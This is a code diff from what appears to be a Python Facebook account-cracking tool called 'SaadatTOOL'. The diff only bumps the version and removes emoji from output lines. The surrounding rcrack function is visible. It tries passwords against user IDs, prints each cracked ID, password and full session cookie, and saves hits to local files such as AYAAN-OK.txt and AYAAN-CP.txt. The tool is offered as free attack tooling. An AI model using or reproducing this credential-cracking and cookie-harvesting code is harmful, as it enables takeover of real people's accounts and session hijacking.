@@ -178,7 +178,7 @@ logo =                                          ("""
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35m Saadatraziq
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m FREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35m Saadat
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.5
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.6
 \033[1;37m================= \33[32;45mSaadat\33[0;m =====================
  
        \33[37;41m\t WELCOME TO SaadatTOOL\33[0;m
@@ -333,7 +333,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Saadat-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(Saadat-Ok)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/AYAAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -341,7 +341,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Saadat-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(Saadat-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/AYAAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
